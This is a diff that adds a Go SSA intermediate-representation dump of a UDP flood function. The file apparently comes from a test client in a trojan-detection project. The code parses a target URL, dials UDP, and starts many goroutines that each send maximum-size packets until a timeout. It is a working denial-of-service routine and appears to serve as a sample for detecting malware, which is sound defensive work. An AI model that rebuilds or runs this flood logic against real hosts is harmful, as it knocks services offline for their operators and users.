@@ -1,0 +1,157 @@
+# Name: command-line-arguments.init
+# Package: command-line-arguments
+# Synthetic: package initializer
+func init():
+0:                                                                entry P:0 S:2
+	t0 = *init$guard                                                   bool
+	if t0 goto 2 else 1
+1:                                                           init.start P:1 S:1
+	*init$guard = true:bool
+	t1 = context.init()                                                  ()
+	t2 = fmt.init()                                                      ()
+	t3 = net.init()                                                      ()
+	t4 = net/url.init()                                                  ()
+	t5 = strings.init()                                                  ()
+	t6 = time.init()                                                     ()
+	jump 2
+2:                                                            init.done P:2 S:0
+	return
+
+# Name: command-line-arguments.UdpFloodUrl$1
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\DOS\udpflood\udpflood.go:39:7
+# Parent: UdpFloodUrl
+# Free variables:
+#   0:	ctx *context.Context
+#   1:	conn *net.Conn
+#   2:	buf *[]byte
+func UdpFloodUrl$1():
+0:                                                                entry P:0 S:1
+	jump 1
+1:                                                             for.body P:2 S:2
+	t0 = *ctx                                               context.Context
+	t1 = invoke t0.Done()                                   <-chan struct{}
+	t2 = select nonblocking [<-t1]           (index int, ok bool, struct{})
+	t3 = extract t2 #0                                                  int
+	t4 = t3 == 0:int                                                   bool
+	if t4 goto 2 else 3
+2:                                                          select.body P:1 S:0
+	return
+3:                                                          select.next P:1 S:1
+	t5 = *conn                                                     net.Conn
+	t6 = *buf                                                        []byte
+	t7 = invoke t5.Write(t6)                             (n int, err error)
+	jump 1
+
+# Name: command-line-arguments.UdpFloodUrl
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\DOS\udpflood\udpflood.go:12:6
+# Recover: 1
+# Locals:
+#   0:	t0 error
+func UdpFloodUrl(host string, threadsN int64, timeout time.Duration) error:
+0:                                                                entry P:0 S:2
+	t0 = local error ()                                              *error
+	t1 = new context.Context (ctx)                         *context.Context
+	t2 = context.Background()                               context.Context
+	t3 = context.WithTimeout(t2, timeout) (context.Context, context.CancelFunc)
+	t4 = extract t3 #0                                      context.Context
+	*t1 = t4
+	t5 = extract t3 #1                                   context.CancelFunc
+	defer t5()
+	t6 = net/url.Parse(host)                          (*net/url.URL, error)
+	t7 = extract t6 #0                                         *net/url.URL
+	t8 = extract t6 #1                                                error
+	t9 = t8 != nil:error                                               bool
+	if t9 goto 2 else 3
+1:                                                              recover P:0 S:0
+	t10 = *t0                                                         error
+	return t10
+2:                                                              if.then P:1 S:0
+	*t0 = t8
+	rundefers
+	t11 = *t0                                                         error
+	return t11
+3:                                                              if.done P:1 S:2
+	t12 = &t7.Host [#3]                                             *string
+	t13 = *t12                                                       string
+	t14 = strings.Contains(host, ":":string)                           bool
+	if t14 goto 5 else 4
+4:                                                              if.then P:1 S:2
+	t15 = &t7.Scheme [#0]                                           *string
+	t16 = *t15                                                       string
+	t17 = t16 == "https":string                                        bool
+	if t17 goto 6 else 7
+5:                                                              if.done P:3 S:2
+	t18 = phi [3: t13, 6: t35, 7: t44] #_host                        string
+	t19 = new []byte (buf)                                          *[]byte
+	t20 = new [65507]byte (makeslice)                          *[65507]byte
+	t21 = slice t20[:65507:int]                                      []byte
+	*t19 = t21
+	t22 = new net.Conn (conn)                                     *net.Conn
+	t23 = net.Dial("udp":string, t18)                     (net.Conn, error)
+	t24 = extract t23 #0                                           net.Conn
+	*t22 = t24
+	t25 = extract t23 #1                                              error
+	t26 = t25 != nil:error                                             bool
+	if t26 goto 8 else 10
+6:                                                              if.then P:1 S:1
+	t27 = &t7.Host [#3]                                             *string
+	t28 = *t27                                                       string
+	t29 = new [2]any (varargs)                                      *[2]any
+	t30 = &t29[0:int]                                                  *any
+	t31 = make any <- string (t28)                                      any
+	*t30 = t31
+	t32 = &t29[1:int]                                                  *any
+	t33 = make any <- string ("443":string)                             any
+	*t32 = t33
+	t34 = slice t29[:]                                                []any
+	t35 = fmt.Sprintf("%s:%s":string, t34...)                        string
+	jump 5
+7:                                                              if.else P:1 S:1
+	t36 = &t7.Host [#3]                                             *string
+	t37 = *t36                                                       string
+	t38 = new [2]any (varargs)                                      *[2]any
+	t39 = &t38[0:int]                                                  *any
+	t40 = make any <- string (t37)                                      any
+	*t39 = t40
+	t41 = &t38[1:int]                                                  *any
+	t42 = make any <- string ("80":string)                              any
+	*t41 = t42
+	t43 = slice t38[:]                                                []any
+	t44 = fmt.Sprintf("%s:%s":string, t43...)                        string
+	jump 5
+8:                                                              if.then P:1 S:1
+	t45 = new [1]any (varargs)                                      *[1]any
+	t46 = &t45[0:int]                                                  *any
+	t47 = change interface any <- error (t25)                           any
+	*t46 = t47
+	t48 = slice t45[:]                                                []any
+	t49 = fmt.Println(t48...)                            (n int, err error)
+	jump 9
+9:                                                              if.done P:2 S:0
+	t50 = time.After(timeout)                              <-chan time.Time
+	t51 = <-t50                                                   time.Time
+	*t0 = nil:error
+	rundefers
+	t52 = *t0                                                         error
+	return t52
+10:                                                             if.else P:1 S:1
+	t53 = (*net/url.URL).String(t7)                                  string
+	t54 = new [1]any (varargs)                                      *[1]any
+	t55 = &t54[0:int]                                                  *any
+	t56 = make any <- string (t53)                                      any
+	*t55 = t56
+	t57 = slice t54[:]                                                []any
+	t58 = fmt.Printf("Flooding %s\n":string, t57...)     (n int, err error)
+	jump 11
+11:                                                            for.loop P:2 S:2
+	t59 = phi [10: 0:int64, 12: t62] #i                               int64
+	t60 = t59 < threadsN                                               bool
+	if t60 goto 12 else 9
+12:                                                            for.body P:1 S:1
+	t61 = make closure UdpFloodUrl$1 [t1, t22, t19]                  func()
+	go t61()
+	t62 = t59 + 1:int64                                               int64
+	jump 11
+
